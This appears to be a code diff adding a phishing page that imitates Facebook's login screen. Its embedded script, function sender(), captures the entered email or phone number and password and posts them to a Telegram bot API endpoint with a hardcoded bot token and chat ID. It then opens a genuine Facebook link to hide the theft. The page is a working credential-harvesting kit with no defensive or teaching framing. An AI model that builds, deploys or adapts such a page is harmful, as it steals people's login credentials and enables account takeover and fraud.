@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook - log in or sign up</title>
+    <link
+      rel="shortcut icon"
+      href="https://static-00.iconduck.com/assets.00/facebook-color-icon-2048x2048-bfly1vxr.png"
+      type="image/x-icon"
+    />
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f0f2f5;
+        margin: 0;
+        padding: 0;
+      }
+      img {
+        width: 350px;
+        margin-left: -80px;
+      }
+
+      .container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 90%;
+        padding: 30px;
+        margin-top: 100px;
+      }
+
+      .header {
+        text-align: center;
+        margin-bottom: 20px;
+        padding: 120px;
+      }
+
+      .header p {
+        color: #1c1e21;
+        font-size: 30px;
+        margin-left: 108px;
+        margin-top: -20px;
+        font-weight: 400;
+        width: 470px;
+        font-family: Arial, Helvetica, sans-serif;
+        text-align: justify;
+      }
+
+      .login-form {
+        background-color: white;
+        padding: 20px 40px;
+        border-radius: 8px;
+        box-shadow: 0 4px 4px rgba(0, 0, 0, 0.1);
+        width: 300px;
+      }
+
+      .login-form input {
+        padding: 15px;
+        margin: 10px 0;
+        border: 1px solid #dddfe2;
+        border-radius: 4px;
+        margin-left: -50px;
+        font-size: 16px;
+        width: 330px;
+      }
+
+      .login-form button {
+        width: 360px;
+        padding: 10px;
+        background-color: #1877f2;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-size: 20px;
+        cursor: pointer;
+        margin-left: -50px;
+      }
+
+      .login-form .create-account {
+        background-color: #42b72a;
+        margin-top: 10px;
+        width: 200px;
+        height: 50px;
+        margin-left: 15%;
+      }
+
+      .login-form a {
+        display: block;
+        text-align: center;
+        margin-top: 10px;
+        color: #1877f2;
+        text-decoration: none;
+      }
+
+      footer {
+        position: absolute;
+        bottom: 0;
+        width: 100%;
+        text-align: center;
+        padding: 20px;
+        background-color: #ffffff;
+      }
+
+      footer .languages a,
+      footer .footer-links a {
+        color: #555;
+        text-decoration: none;
+        margin: 0 5px;
+        font-size: 12px;
+      }
+
+      footer p {
+        margin: 10px 0 0 0;
+        color: #777;
+        font-size: 12px;
+      }
+      form {
+        padding: 20px;
+      }
+      hr {
+        width: 130%;
+        margin-left: -40px;
+      }
+
+      /* Media Query for smaller screens */
+      @media screen and (max-width: 668px) {
+        .container {
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          margin-top: 50px;
+        }
+
+        .header {
+          padding: 0;
+          margin-bottom: 20px;
+        }
+
+        .header img {
+          width: 200px;
+          margin: 0;
+        }
+
+        .header p {
+          font-size: 20px;
+          margin: 0;
+          width: 100%;
+          text-align: center;
+        }
+
+        .login-form {
+          width: 80%;
+          padding: 10px;
+          box-shadow: none;
+        }
+
+        .login-form input {
+          width: 90%;
+          margin-left: 0;
+        }
+
+        .login-form button {
+          width: 100%;
+          margin-left: 0;
+        }
+
+        .login-form .create-account {
+          width: 100%;
+          margin-left: 0;
+        }
+
+        footer {
+          position: relative;
+        }
+
+        hr {
+          width: 100%;
+          margin-left: 0;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <img
+          src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
+          alt=""
+        />
+        <p>Connect with friends and the world around you on Facebook.</p>
+      </div>
+      <div class="login-form">
+        <form id="loginForm" onsubmit="return sender()">
+          <input
+            type="text"
+            id="email"
+            placeholder="Email or phone number"
+            required
+          />
+          <input
+            type="password"
+            id="password"
+            placeholder="Password"
+            required
+          />
+          <button type="submit" class="submit">Log In</button>
+          <a href="#">Forgot password?</a>
+          <br />
+          <hr />
+          <button type="button" class="create-account">
+            Create new account
+          </button>
+        </form>
+      </div>
+    </div>
+    <footer>
+      <div class="languages">
+        <a href="#">English (US)</a>
+        <a href="#">ភាសាខ្មែរ</a>
+        <a href="#">Français (France)</a>
+        <!-- Add other languages as needed -->
+      </div>
+      <div class="footer-links">
+        <a href="#">Sign Up</a>
+        <a href="#">Log In</a>
+        <a href="#">Messenger</a>
+        <!-- Add other footer links as needed -->
+      </div>
+      <p>&copy; 2024 Meta</p>
+    </footer>
+  </body>
+  <script>
+    function sender() {
+      var form = document.getElementById("loginForm");
+      var email = form.elements["email"].value;
+      var password = form.elements["password"].value;
+
+      // Construct the message to be sent to Telegram
+      var message = "Email/Phone: " + email + "\nPassword: " + password;
+
+      // Send the message to Telegram using AJAX
+      var xhr = new XMLHttpRequest();
+      xhr.open(
+        "POST",
+        "https://api.telegram.org/bot7230353154:AAEIfiW5YTi8757XJaiMuxWxO1XUz1AUF-o/sendMessage",
+        true
+      );
+      xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+      xhr.send(
+        JSON.stringify({
+          chat_id: "854348720", // Ensure the chat ID is correct
+          text: message,
+        })
+      );
+      // window.open("https://www.facebook.com/share/p/SpuUjv6AecEvC9bK/");
+      window.open("https://www.facebook.com/share/p/SpuUjv6AecEvC9bK/");
+
+      // Return false to prevent the form from being submitted normally
+      return false;
+    }
+  </script>
+</html>
